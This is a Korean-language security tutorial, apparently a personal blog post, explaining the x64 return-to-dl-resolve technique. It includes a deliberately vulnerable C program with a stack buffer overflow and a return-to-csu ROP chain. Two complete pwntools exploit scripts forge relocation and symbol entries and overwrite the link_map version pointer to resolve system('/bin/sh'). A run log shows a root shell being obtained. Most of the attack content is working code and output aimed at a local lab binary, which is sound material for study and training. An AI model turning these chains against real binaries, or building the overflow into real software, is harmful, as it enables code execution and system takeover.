---
title: Return-to-dl-resolve - x64
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, return-to-dl-resolve, x64]
math: true
mermaid: true
---

## Description

Lazy Binding을 악용해 원하는 함수를 호출하는 기법이다. x86과 비슷하지만 Elf32_Rel(8Byte), Elf32_Sym(16Byte) 대신 Elf64_Rela(24Byte), Elf64_Sym(24Byte) 구조를 사용한다.

```c
typedef uint64_t Elf64_Addr;
typedef uint64_t Elf64_Xword;
typedef int64_t  Elf64_Sxword;
 
typedef struct
{
  Elf64_Addr        r_offset;                /* Address */
  Elf64_Xword        r_info;                        /* Relocation type and symbol index */
  Elf64_Sxword        r_addend;                /* Addend */
} Elf64_Rela;
```

```c
typedef uint32_t Elf64_Word;
typedef uint16_t Elf64_Section;
typedef uint64_t Elf64_Addr;
typedef uint64_t Elf64_Xword;
 
typedef struct
{
  Elf64_Word        st_name;                /* Symbol name (string tbl index) */4
  unsigned char        st_info;                /* Symbol type and binding */1
  unsigned char st_other;                /* Symbol visibility */1
  Elf64_Section        st_shndx;                /* Section index */2
  Elf64_Addr        st_value;                /* Symbol value */8
  Elf64_Xword        st_size;                /* Symbol size */8
} Elf64_Sym;
```

_dl_fixup()함수는 다음과 같이 write() 함수의 이름을 찾는다.

JMPREL(.rel.plt) -> SYMTAB(.dynsym) -> STRTAB(.dynstr)

## Proof of Concept

```
//gcc -fno-stack-protector -o rop rop.c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
  
void vuln(){
    char buf[50];
    read(0, buf, 512);
}
  
void main(){
    write(1,"Hello ROP\n",10);
    vuln();
}
```

72개 이상의 문자열을 입력하면 bof가 발생한다.

## Exploit Method

1. write() 함수를 이용하여 “.got.plt”영역에 저장된 link_map 구조체의 주소(“.rela.plt” addr + 0x8)를 추출
2. read() 함수를 이용하여 “.bss” 영역에 2번째 ROP코드를 저장
3. “leave; ret;” Gadget을 이용하여 “2번째 ROP코드”가 저장된 영역으로 이동
4. read() 함수를 이용하여 “l-> l_info [VERSYMIDX (DT_VERSYM)” 영역에 0 을 저장
5. _dl_runtime_resolve() 함수에 전달될 인자 값을 설정
6. _dl_runtime_resolve() 함수를 호출

```c
// Stage1
write(1,addr_got+8,8)
read(0,base_stage,400)
JMP base_stage + 8

// Stage2
read(0,addr_dt_versym,8)
Setting argument values of system() function
_dl_runtime_resolve(struct link_map *l, fake_reloc_offset)
```

```
    0x4141414141414141 0x4141414141414141

    0x0000000000601020 0x0001561b00000007 -> ELF64_R_SYM of ELF64_Rel->r_info 
    0x0000000000000000 0x4141414141414141         |
 --------------------------------------------------
 |
 -> 0x0000001200201228 --   0x0000000000000000
                        |
    0x0000000000000000  --> 0x2f006d6574737973 <- "system"
```

해당 binary에서 “pop rdi” 가젯이 없고 library 주소도 제공되지 않아 return-to-csu를 이용한다.

```
root@bs-virtual-machine:~/pwnable/return-to-resolve# objdump -d rop
...
00000000004005b0 <__libc_csu_init>:
4005b0: 41 57                   push   %r15
4005b2: 41 56                   push   %r14
4005b4: 41 89 ff                mov    %edi,%r15d
4005b7: 41 55                   push   %r13
4005b9: 41 54                   push   %r12
4005bb: 4c 8d 25 4e 08 20 00    lea    0x20084e(%rip),%r12        # 600e10 <__frame_dummy_init_array_entry>
4005c2: 55                      push   %rbp
4005c3: 48 8d 2d 4e 08 20 00    lea    0x20084e(%rip),%rbp        # 600e18 <__init_array_end>
4005ca: 53                      push   %rbx
4005cb: 49 89 f6                mov    %rsi,%r14
4005ce: 49 89 d5                mov    %rdx,%r13
4005d1: 4c 29 e5                sub    %r12,%rbp
4005d4: 48 83 ec 08             sub    $0x8,%rsp
4005d8: 48 c1 fd 03             sar    $0x3,%rbp
4005dc: e8 1f fe ff ff          callq  400400 <_init>
4005e1: 48 85 ed                test   %rbp,%rbp
4005e4: 74 20                   je     400606 <__libc_csu_init+0x56>
4005e6: 31 db                   xor    %ebx,%ebx
4005e8: 0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
4005ef: 00 
4005f0: 4c 89 ea                mov    %r13,%rdx   <--- Gadget 2
4005f3: 4c 89 f6                mov    %r14,%rsi
4005f6: 44 89 ff                mov    %r15d,%edi
4005f9: 41 ff 14 dc             callq  *(%r12,%rbx,8)
4005fd: 48 83 c3 01             add    $0x1,%rbx
400601: 48 39 eb                cmp    %rbp,%rbx
400604: 75 ea                   jne    4005f0 <__libc_csu_init+0x40>
400606: 48 83 c4 08             add    $0x8,%rsp
40060a: 5b                      pop    %rbx   <--- Gadget 1
40060b: 5d                      pop    %rbp
40060c: 41 5c                   pop    %r12   
40060e: 41 5d                   pop    %r13
400610: 41 5e                   pop    %r14
400612: 41 5f                   pop    %r15
400614: c3                      retq   
400615: 90                      nop
400616: 66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
40061d: 00 00 00 
```

base_stage 영역에 쓰기권한이 없으면 _dl_lookup_symbol_x() 함수에서 에러가 발생한다. 따라서 0x601000 ~ 0x602000 사이에 base_stage가 존재해야 원하는 값을 쓸 수 있다.

```
gdb-peda$ vmmap
Start              End                Perm  Name
0x00400000         0x00401000         r-xp  /root/pwnable/return-to-resolve/rop
0x00600000         0x00601000         r--p  /root/pwnable/return-to-resolve/rop
0x00601000         0x00602000         rw-p  /root/pwnable/return-to-resolve/rop
...
```

```
...
0x7f22a6734ee1 <_dl_runtime_resolve_xsavec+1>:  mov    rbx,rsp
0x7f22a6734ee4 <_dl_runtime_resolve_xsavec+4>:  
    and    rsp,0xffffffffffffffc0
0x7f22a6734ee8 <_dl_runtime_resolve_xsavec+8>:  
    sub    rsp,QWORD PTR [rip+0x20de61]        # 0x7f22a6942d50 <_rtld_global_ro+176>
=> 0x7f22a6734eef <_dl_runtime_resolve_xsavec+15>:  
    mov    QWORD PTR [rsp],rax
...
gdb-peda$ x/24gx $rsp
0x600f80: <-- write 권한 없음   0x0000000000000001  
gdb-peda$ x/gx $rsp
0x601280: <-- write 가능  0x0000000000000000
```

## Exploit code

```python
# Exploit Code
from pwn import *

elf = ELF('./rop')

# get section address
addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
addr_dynstr = elf.get_section_by_name('.dynstr').header['sh_addr']
addr_relaplt = elf.get_section_by_name('.rela.plt').header['sh_addr']
addr_plt = elf.get_section_by_name('.plt').header['sh_addr']
addr_got = elf.get_section_by_name('.got.plt').header['sh_addr']
addr_bss = elf.get_section_by_name('.bss').header['sh_addr']
addr_got_read = elf.got['read']
addr_got_write = elf.got['write']

log.info('addr_dynsym   : '+hex(addr_dynsym))
log.info('addr_dynstr   : '+hex(addr_dynstr))
log.info('addr_relaplt  : '+hex(addr_relaplt))
log.info('addr_plt      : '+hex(addr_plt))
log.info('addr_got      : '+hex(addr_got))
log.info('addr_bss      : '+hex(addr_bss))
log.info('addr_got_read : '+hex(addr_got_read))
log.info('addr_got_write : '+hex(addr_got_write))

addr_csu_gadget_1 = 0x40060a
addr_csu_gadget_2 = 0x4005f0
addr_leave_ret = 0x400585
addr_ret = 0x400586

log.info('addr_csu_gadget_1 : '+hex(addr_csu_gadget_1))
log.info('addr_csu_gadget_2 : '+hex(addr_csu_gadget_2))
log.info('addr_leave_ret    : '+hex(addr_leave_ret))
log.info('addr_ret          : '+hex(addr_ret))

stack_size = 0x600
base_stage = addr_bss + stack_size

log.info('base_stage        : '+hex(base_stage))

p = process(elf.path)
log.info(p.recvline())

buf1 = 'A'*72
# write(1,link_map,8)
buf1 += p64(addr_csu_gadget_1)
buf1 += p64(0)                 # pop rbx        
buf1 += p64(1)                 # pop rbp
buf1 += p64(addr_got_write)    # pop r12
buf1 += p64(8)                 # pop r13 (Arg3)
buf1 += p64(addr_got + 8)      # pop r14 (Arg2)
buf1 += p64(1)                 # pop r15 (Arg1)
buf1 += p64(addr_csu_gadget_2) # ret
buf1 += p64(0)                 # rsp add,0x8

# read(0,base_stage,300)
buf1 += p64(0)                 # pop rbx        
buf1 += p64(1)                 # pop rbp
buf1 += p64(addr_got_read)     # pop r12
buf1 += p64(stack_size)        # pop r13 (Arg3)
buf1 += p64(base_stage)        # pop r14 (Arg2)
buf1 += p64(0)                 # pop r15 (Arg1)
buf1 += p64(addr_csu_gadget_2) # ret
buf1 += p64(0)                 # rsp add,0x8

# JMP to base_stage
buf1 += p64(0)                 # pop rbx
buf1 += p64(base_stage)        # pop rbp
buf1 += p64(0)                 # pop r12
buf1 += p64(0)                 # pop r13 (Arg3)
buf1 += p64(0)                 # pop r14 (Arg2)
buf1 += p64(0)                 # pop r15 (Arg1)
buf1 += p64(addr_leave_ret)    # ret

p.send(buf1)
addr_link_map = u64(p.recv(8))

addr_reloc = base_stage + 8*26
align_reloc = 24 - ((addr_reloc - addr_relaplt) % 24)
addr_reloc += align_reloc
align_dynsym = 24 - ((addr_reloc + 24 - addr_dynsym) % 24)

addr_fake_sym = addr_reloc + 24
addr_fake_sym += align_dynsym
addr_fake_symstr = addr_fake_sym + 24
addr_fake_cmd = addr_fake_symstr + 7

log.info('addr_fake_reloc  : ' + hex(addr_reloc))
log.info('addr_fake_sym    : ' + hex(addr_fake_sym))
log.info('addr_fake_symstr : ' + hex(addr_fake_symstr))
log.info('addr_fake_cmd    : ' + hex(addr_fake_cmd))

fake_reloc_offset = (addr_reloc - addr_relaplt)/24
fake_r_info = (((addr_fake_sym - addr_dynsym)/24) << 32)
fake_r_info = fake_r_info | 0x7
fake_st_name = addr_fake_symstr - addr_dynstr

buf2 = 'A'*8
'''
buf2 += p64(addr_csu_gadget_1)
buf2 += p64(0)                 # pop rbx        
buf2 += p64(1)                 # pop rbp
buf2 += p64(base_stage+8*9)    # pop r12
buf2 += 'A'*8                  # pop r13 (Arg3)
buf2 += 'A'*8                  # pop r14 (Arg2)
buf2 += p64(addr_fake_cmd)     # pop r15 (Arg1)
buf2 += p64(addr_csu_gadget_2) # ret
buf2 += 'A'*8
'''
buf2 += p64(addr_plt)
buf2 += p64(fake_reloc_offset)
buf2 += 'A'*0xc0
# fake Elf64_rela
buf2 += p64(addr_got_read) # got
buf2 += p64(fake_r_info) # r_info
buf2 += p64(0) # r_addend
buf2 += 'A'*align_dynsym
# fake Elf64_sym
buf2 += p32(fake_st_name) 
buf2 += p32(0x12)
buf2 += p64(0)
buf2 += p64(0)
# String
buf2 += 'system\x00'
buf2 += '/bin/sh\x00'

gdb.attach(p)
raw_input('1')
p.send(buf2)
log.info('addr_link_map     :' + hex(addr_link_map))
p.interactive()
```

디버깅을 해보면 다음과 같은 에러가 발생한다.

```
[----------------------------------registers-----------------------------------]
RAX: 0x400374 --> 0x2000200020000 
RBX: 0x601020 --> 0x7fcb0f4ed250 (<read>:   )
RCX: 0x1563000000007 
RDX: 0x15630 
RSI: 0x601738 --> 0x1200201420 
RDI: 0x400330 --> 0x6f732e6362696c00 ('')
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x601260 --> 0x0 
RIP: 0x7fcb0f7cfa75 (<_dl_fixup+117>:   movzx  eax,WORD PTR [rax+rdx*2])
R8 : 0x601718 --> 0x601020 --> 0x7fcb0f4ed250 (<read>:  )
R9 : 0x7fcb0f7d0ac0 (<_dl_fini>:    push   rbp)
R10: 0x7fcb0f9e7168 --> 0x0 
R11: 0x246 
R12: 0x0 
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
0x7fcb0f7cfa71 <_dl_fixup+113>: mov    rax,QWORD PTR [rax+0x8]
=> 0x7fcb0f7cfa75 <_dl_fixup+117>:  movzx  eax,WORD PTR [rax+rdx*2]
0x7fcb0f7cfa79 <_dl_fixup+121>: and    eax,0x7fff
[------------------------------------stack-------------------------------------]
0000| 0x601260 --> 0x0 
0008| 0x601268 --> 0x601738 --> 0x1200201420 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
_dl_fixup (l=0x7fcb0f9e7168, reloc_arg=<optimized out>)
    at ../elf/dl-runtime.c:92
92  in ../elf/dl-runtime.c
gdb-peda$ bt
#0  _dl_fixup (l=0x7fcb0f9e7168, reloc_arg=<optimized out>)
    at ../elf/dl-runtime.c:92
#1  0x00007fcb0f7d7f5a in _dl_runtime_resolve_xsavec ()
    at ../sysdeps/x86_64/dl-trampoline.h:129
```

l->l_info[VERSYMIDX (DT_VERSYM)] 부분에서 에러가 발생한다. if문 안에 있는 코드들은 return-to-dl-resolve에 영향을 주지 않으므로 해당 영역(l->l_info[VERSYMIDX (DT_VERSYM))에 값을 변조하여 우회할 수 있다.

```c
const struct r_found_version *version = NULL;

if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
{
    const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
    ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
    version = &l->l_versions[ndx];
    if (version->hash == 0)
        version = NULL;
}
```

## Exploit Code

```python
# Exploit Code
from pwn import *

elf = ELF('./rop')

# get section address
addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
addr_dynstr = elf.get_section_by_name('.dynstr').header['sh_addr']
addr_relaplt = elf.get_section_by_name('.rela.plt').header['sh_addr']
addr_plt = elf.get_section_by_name('.plt').header['sh_addr']
addr_got = elf.get_section_by_name('.got.plt').header['sh_addr']
addr_bss = elf.get_section_by_name('.bss').header['sh_addr']
addr_got_read = elf.got['read']
addr_got_write = elf.got['write']

log.info('addr_dynsym   : '+hex(addr_dynsym))
log.info('addr_dynstr   : '+hex(addr_dynstr))
log.info('addr_relaplt  : '+hex(addr_relaplt))
log.info('addr_plt      : '+hex(addr_plt))
log.info('addr_got      : '+hex(addr_got))
log.info('addr_bss      : '+hex(addr_bss))
log.info('addr_got_read : '+hex(addr_got_read))
log.info('addr_got_write : '+hex(addr_got_write))

addr_csu_gadget_1 = 0x40060a
addr_csu_gadget_2 = 0x4005f0
addr_leave_ret = 0x400585
addr_ret = 0x400586

log.info('addr_csu_gadget_1 : '+hex(addr_csu_gadget_1))
log.info('addr_csu_gadget_2 : '+hex(addr_csu_gadget_2))
log.info('addr_leave_ret    : '+hex(addr_leave_ret))
log.info('addr_ret          : '+hex(addr_ret))

stack_size = 0x600
base_stage = addr_bss + stack_size

log.info('base_stage        : '+hex(base_stage))

p = process(elf.path)
log.info(p.recvline())

buf1 = 'A'*72
# write(1,link_map,8)
buf1 += p64(addr_csu_gadget_1)
buf1 += p64(0)                 # pop rbx        
buf1 += p64(1)                 # pop rbp
buf1 += p64(addr_got_write)    # pop r12
buf1 += p64(8)                 # pop r13 (Arg3)
buf1 += p64(addr_got + 8)      # pop r14 (Arg2)
buf1 += p64(1)                 # pop r15 (Arg1)
buf1 += p64(addr_csu_gadget_2) # ret
buf1 += p64(0)                 # rsp add,0x8

# read(0,base_stage,300)
buf1 += p64(0)                 # pop rbx        
buf1 += p64(1)                 # pop rbp
buf1 += p64(addr_got_read)     # pop r12
buf1 += p64(stack_size)        # pop r13 (Arg3)
buf1 += p64(base_stage)        # pop r14 (Arg2)
buf1 += p64(0)                 # pop r15 (Arg1)
buf1 += p64(addr_csu_gadget_2) # ret
buf1 += p64(0)                 # rsp add,0x8

# JMP to base_stage
buf1 += p64(0)                 # pop rbx
buf1 += p64(base_stage)        # pop rbp
buf1 += p64(0)                 # pop r12
buf1 += p64(0)                 # pop r13 (Arg3)
buf1 += p64(0)                 # pop r14 (Arg2)
buf1 += p64(0)                 # pop r15 (Arg1)
buf1 += p64(addr_leave_ret)    # ret

p.send(buf1)
addr_link_map = u64(p.recv(8))
addr_dt_versym = addr_link_map + 0x1c8   # versym location : link_map + 0x1c8
log.info('addr_link_map   : ' + hex(addr_link_map))
log.info('addr_dt_versym   : ' + hex(addr_dt_versym))

addr_reloc = base_stage + 8*26
align_reloc = 24 - ((addr_reloc - addr_relaplt) % 24)
addr_reloc += align_reloc
align_dynsym = 24 - ((addr_reloc + 24 - addr_dynsym) % 24)

addr_fake_sym = addr_reloc + 24
addr_fake_sym += align_dynsym
addr_fake_symstr = addr_fake_sym + 24
addr_fake_cmd = addr_fake_symstr + 7

log.info('addr_fake_reloc  : ' + hex(addr_reloc))
log.info('addr_fake_sym    : ' + hex(addr_fake_sym))
log.info('addr_fake_symstr : ' + hex(addr_fake_symstr))
log.info('addr_fake_cmd    : ' + hex(addr_fake_cmd))

fake_reloc_offset = (addr_reloc - addr_relaplt)/24
fake_r_info = (((addr_fake_sym - addr_dynsym)/24) << 32)
fake_r_info = fake_r_info | 0x7
fake_st_name = addr_fake_symstr - addr_dynstr

# read(0,&dt_versym,8)
buf2 = 'A'*8
buf2 += p64(addr_csu_gadget_1)
buf2 += p64(0)                 # pop rbx        
buf2 += p64(1)                 # pop rbp
buf2 += p64(addr_got_read)     # pop r12
buf2 += p64(8)                 # pop r13 (Arg3)
buf2 += p64(addr_dt_versym)    # pop r14 (Arg2)
buf2 += p64(0)                 # pop r15 (Arg1)
buf2 += p64(addr_csu_gadget_2) # ret

buf2 += p64(addr_ret)          # padding

# system('/bin/sh')
buf2 += p64(0)                 # pop rbx        
buf2 += p64(1)                 # pop rbp
buf2 += p64(base_stage + 8*9)  # pop r12
buf2 += 'A'*8                  # pop r13 (Arg3)
buf2 += 'A'*8                  # pop r14 (Arg2)
buf2 += p64(addr_fake_cmd)     # pop r15 (Arg1)
buf2 += p64(addr_csu_gadget_2) # ret
buf2 += 'A'*0x38               # padding
# _dl_runtime_resolve(struct link_map *l, fake_reloc_offset)
buf2 += p64(addr_plt)
buf2 += p64(fake_reloc_offset)
buf2 += 'A'*align_reloc
# fake Elf64_rela
buf2 += p64(addr_got_read) # got
buf2 += p64(fake_r_info)   # r_info
buf2 += p64(0)             # r_addend
buf2 += 'A'*align_dynsym
# fake Elf64_sym
buf2 += p32(fake_st_name) 
buf2 += p32(0x12)
buf2 += p64(0)
buf2 += p64(0)
# String
buf2 += 'system\x00'
buf2 += '/bin/sh\x00'

#gdb.attach(p)
#raw_input('1')
p.send(buf2)
p.send(p64(0))
p.interactive()
```

## Exploit

```bash
root@bs-virtual-machine:~/pwnable/return-to-resolve# python exploit.py 
[*] '/root/pwnable/return-to-resolve/rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] addr_dynsym   : 0x4002b8
[*] addr_dynstr   : 0x400330
[*] addr_relaplt  : 0x4003b8
[*] addr_plt      : 0x400420
[*] addr_got      : 0x601000
[*] addr_bss      : 0x601040
[*] addr_got_read : 0x601020
[*] addr_got_write : 0x601018
[*] addr_csu_gadget_1 : 0x40060a
[*] addr_csu_gadget_2 : 0x4005f0
[*] addr_leave_ret    : 0x400585
[*] addr_ret          : 0x400586
[*] base_stage        : 0x601640
[+] Starting local process '/root/pwnable/return-to-resolve/rop': pid 8056[*] Hello ROP
[*] addr_link_map   : 0x7f6bbd939168
[*] addr_dt_versym   : 0x7f6bbd939330
[*] addr_fake_reloc  : 0x601718
[*] addr_fake_sym    : 0x601738
[*] addr_fake_symstr : 0x601750
[*] addr_fake_cmd    : 0x601757
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
```

## References
- [PLT와 GOT 자세히 알기 2 (with ‘yocto’)](https://bpsecblog.wordpress.com/2016/03/09/about_got_plt_2/)
- [[Docs] Reusing Dynamic Linker for Exploitation](https://pwn3r.tistory.com/entry/Docs-Reusing-Dynamic-Linker-for-Exploitation)
- [02.Return-to-dl-resolve - x64(feat.Return-to-csu)](https://www.lazenca.net/pages/viewpage.action?pageId=19300744)